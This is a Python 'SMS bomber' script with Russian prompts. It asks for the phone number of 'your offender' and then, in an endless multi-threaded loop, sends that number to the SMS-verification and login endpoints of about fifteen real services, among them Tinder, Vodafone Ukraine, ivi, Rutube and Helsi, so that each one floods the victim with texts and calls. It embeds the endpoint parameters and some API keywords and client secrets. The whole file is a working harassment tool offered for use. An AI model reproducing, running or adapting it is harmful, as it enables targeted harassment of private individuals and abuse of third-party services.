import requests, random, datetime, sys, time, argparse, os
import threading
import json
from colorama import init
from termcolor import colored
from torrequest import TorRequest
init()
print(colored("Введите название страны(РУС, УКР)", "yellow"))
while True:
	country = str(input("-----> "))
	country = country.lower()
	if country == "укр" or country == "рус":
		break
	if country != "укр" or country != "рус":
		print(colored("Я вроде ясно выразелся, тут только либо РУС, либо УКР", "red"))

print(colored("А теперь номер вашего обидчика (пример: 7хххххххххх или 38хххххххххх)", "yellow"))
while True:
	try:
		phone = int(input("-----> "))
		if country == "укр" and len(str(phone)) == 12:
			_phone = str(phone)[2:]
			phonebuzzolls = f"+38 ({_phone[0:3]}) {_phone[3:6]}-{_phone[6:8]}-{_phone[8:10]}"
			phonedianet = f"+38 ({_phone[0:3]}) {_phone[3:6]} {_phone[6:8]} {_phone[8:10]}"
			phoneiQlab = f"+38 ({_phone[0:3]}) {_phone[3:6]} {_phone[6:8]} {_phone[8:10]}"
			phonevodafone = _phone[1:]
			print(colored(phonevodafone, "green"))
			print(colored(phone, "green"))
			break
		elif country == "рус" and len(str(phone)) == 11:
			_phone = str(phone)[1:]
			phonebuzzolls = f"+7 ({_phone[0:3]}) {_phone[3:5]}-{_phone[6:7]}-{_phone[8:9]}"
			print(colored(phonebuzzolls, "green"))
			print(colored(phone, "green"))
			break
		elif country == "укр" and len(str(phone)) != 12:
			print(colored("В номере ошибка", "red"))
		elif country == "рус" and len(str(phone)) != 11:
			print(colored("В номере ошибка", "red"))
	except:
		print(colored("В номере ошибка", "red"))

print(colored("Во сколько потоков атаковать(максимум столько, сколько у вас ядров на компе):", "yellow"))
while True:
	try:
		th = int(input("-----> "))
		break
	except:
		print(colored("В кол-во потоках ошибка", "red"))
phone = str(phone)
_phone = str(_phone)
password = ['1gjfgj56', '96fg8072533', '5367493sdg', '232lkgshlg', '6jl09225', '823iom5']
email = 'email_man_today@mail.ru'

def loop(password, sleep_time, k, th):
	sleep_time = float(sleep_time)
	password = random.choice(password)
	try:
		buzzolls = requests.get(
				"https://it.buzzolls.ru:9995/api/v2/auth/register",
				params={"phoneNumber": "+"+phone},
				headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"}
			)
		if str(buzzolls) == "<Response [200]>":
			print(colored("[+] Buzzolls отправленно", "green"))
		else:
			print(colored("[-] Buzzolls НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		alfalife = requests.post(
				"https://alfalife.cc/auth.php", 
				data={"phone": _phone},
				headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"}
			)
		if str(alfalife) == "<Response [200]>" and not "error" in str(alfalife.content):
			print(colored("[+] Alfalife отправленно", "green"))
		else:
			print(colored("[-] Alfalife НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		beltelecom = requests.post(
			'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', 
			data={'phone': phone})
		if str(beltelecom) == "<Response [200]>" and not "error" in str(beltelecom.content):
			print(colored("[+] Beltelecom отправленно", "green"))
		else:
			print(colored("[-] Beltelecom НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		vodafone = requests.post(
			'https://cscapp.vodafone.ua/eai_mob/start.swe?SWEExtSource=JSONConverter&SWEExtCmd=Execute', 
			json={
				"params":
					{"version":"1.8.0",
					"language":"ru",
					"source":"WebApp",
					"token":"null",
					"manufacture":"",
					"childNumber":"",
					"accessType":"",
					"spinner":1},
				"requests":
					{"loginV2":
						{"id":phonevodafone}
					}
				}, 
			headers={
				"Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6",
				"Connection": "keep-alive",
				"Host": "cscapp.vodafone.ua",
				"Origin": "https://my.vodafone.ua",
				"Referer": "https://my.vodafone.ua/auth/sign-in",
			})
		if str(vodafone) == "<Response [200]>" and not "error" in str(vodafone.content):
			print(colored("[+] Vodafone отправленно", "green"))
		else:
			print(colored("[-] Vodafone НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		tinder = requests.post(
			'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
			data={'phone_number': phone})
		if str(tinder) == "<Response [200]>" and not "error" in str(tinder.content):
			print(colored('[+] Tinder отправлено', 'green'))
		else:
			print(colored("[-] Tinder НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		ivi = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": '+' + phone})
		if str(ivi) == "<Response [200]>" and not "error" in str(ivi.content):
			print(colored('[+] IvI отправлено', 'green'))
		else:
			print(colored("[-] IvI НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		helsi = requests.post(
			"https://helsi.me/api/healthy/accounts/login",
			json={"phone": phone, "platform": "PISWeb"},
		)
		if str(helsi) == "<Response [202]>" or str(helsi) == "<Response [200]>":
			print(colored('[+] Helsi отправлено', 'green'))
		else:
			print(colored("[-] Helsi НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		citilink = requests.post(
				f"https://www.citilink.ru/registration/check/phone/{phone}/")
		if str(citilink) == "<Response [200]>":
			print(colored('[+] Citilink отправлено', 'green'))
		else:
			print(colored("[-] Citilink НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		dianet = requests.post(
			"https://my.dianet.com.ua/send_sms/", 
			data={"phone": _phone,},
			headers={
				"Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6",
				"Connection": "keep-alive",
				"Host": "my.dianet.com.ua",
				"Origin": "https://my.dianet.com.ua",
				"Referer": "https://my.dianet.com.ua/login/",
				
			}
		)
		if str(dianet) == "<Response [200]>":
			print(colored('[+] Dianet отправлено', 'green'))
		else:
			print(colored("[-] Dianet НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		eldorado = requests.post(
			f"https://api.eldorado.ua/v1/sign/",
			params={
			"login": phone,
			"step": "phone-check",
			"fb_id": "null",
			"fb_token": "null",
			"lang": "ru"},
			headers={})
		if str(eldorado) == "<Response [200]>":
			print(colored('[+] Eldorado отправлено', 'green'))
		else:
			print(colored("[-] Eldorado НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		fixprice = requests.post(
			"https://fix-price.ru/ajax/register_phone_code.php",
			data={"register_call": "Y", "action": "getCode", "phone": "+" + phone},
		)
		if str(fixprice) == "<Response [200]>":
			print(colored('[+] FixPrice отправлено', 'green'))
		else:
			print(colored("[-] FixPrice НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		getmancar = requests.post(
			"https://crm.getmancar.com.ua/api/veryfyaccount",
			json={
				"phone": "+" + phone,
				"grant_type": "password",
				"client_id": "gcarAppMob",
				"client_secret": "SomeRandomCharsAndNumbersMobile",
			}, 
			timeout=2
		)
		if str(getmancar) == "<Response [200]>":
			print(colored('[+] Getmancar отправлено', 'green'))
		else:
			print(colored("[-] Getmancar НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		rutube = requests.post(
			'https://pass.rutube.ru/api/accounts/phone/send-code/',
			data={
				"phone": "+" + phone, 
				"g-recaptcha-response": ""
			},
			headers = {
				'Accept-Language':'uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7',
				'Connection':'keep-alive',
				'Host':'pass.rutube.ru',
				'origin':'https://rutube.ru',
				'Referer':'https://rutube.ru/'
			})
		if str(rutube) == "<Response [200]>":
			print(colored('[+] RuTube отправлено', 'green'))
		else:
			print(colored("[-] RuTube НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		citrus = requests.get(
			f"https://my.citrus.ua/hunter/?hcode=b5f7ac4514f7c0a1133fb71ffcc99f1b&phone={phone}",
			params={"hcode":"b5f7ac4514f7c0a1133fb71ffcc99f1b", 
					"phone": phone}
			)
		if str(citrus) == "<Response [200]>":
			print(colored('[+] Сitrus звонок отправлено', 'green'))
		else:
			print(colored("[-] Сitrus звонок НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		mamamia = requests.post(
			f"https://mamamia.ua/api/auth/login",
			data={"phone":_phone},
			headers={
				"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
			})
		if str(mamamia) == "<Response [200]>":
			print(colored('[+] Mamamia отправлено', 'green'))
		else:
			print(colored("[-] Mamamia НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)

	print(colored(f"{k}/{th} круг пройден", "yellow"))

#Потоки
k = 1
_sleep = "0"
while True:
	if th >= 1:
		t1 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t1.start()
		_threat = t1
	if th >= 2:
		t2 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t2.start()
		_threat = t2
	if th >= 3:
		t3 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t3.start()
		_threat = t3
	if th >= 4:
		t4 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t4.start()
		_threat = t4
	if th >= 5:
		t5 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t5.start()
		_threat = t5
	if th >= 6:
		t6 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t6.start()
		_threat = t6
	if th >= 7:
		t7 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t7.start()
		_threat = t7
	if th >= 8:
		t8 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t8.start()
		_threat = t8
	if th >= 9:
		t9 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t9.start()
		_threat = t9
	if th >= 11:
		t11 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t11.start()
		_threat = t11
	if th >= 12:
		t12 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t12.start()
		_threat = t12
	if th >= 13:
		t13 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t13.start()
		_threat = t13
	if th >= 14:
		t14 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t14.start()
		_threat = t14
	if th >= 15:
		t15 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t15.start()
		_threat = t15
	if th >= 16:
		t16 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t16.start()
		_threat = t16
	if th >= 17:
		t17 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t17.start()
		_threat = t17
	if th >= 18:
		t18 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t18.start()
		_threat = t18
	if th >= 19:
		t19 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t19.start()
		_threat = t19
	if th >= 20:
		t20 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t20.start()
		_threat = t20
	if th >= 21:
		t21 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t21.start()
		_threat = t21
	if th >= 22:
		t22 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t22.start()
		_threat = t22
	if th >= 23:
		t23 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t23.start()
		_threat = t23
	if th >= 24:
		t24 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t24.start()
		_threat = t24
	if th >= 25:
		t25 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t25.start()
		_threat = t25
	if th >= 26:
		t26 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t26.start()
		_threat = t26
	_threat.join()

	# if th == k:
	# 	print(colored("Всё готово, ждем реакции ^-^", 'yellow'))
	# 	time.sleep(5)
	# 	exit()
	k += 1
# 	t26 = threading.Thread(target=loop, args=(password, _sleep))
# 	t26.start()
# 	_threat = t26
# 	_threat.join()
# 	i += 1
	# if th == i:
	# 	print(colored("Всё готово, ждем реакции ^-^", 'yellow'))
	# 	time.sleep(5)
	# 	exit()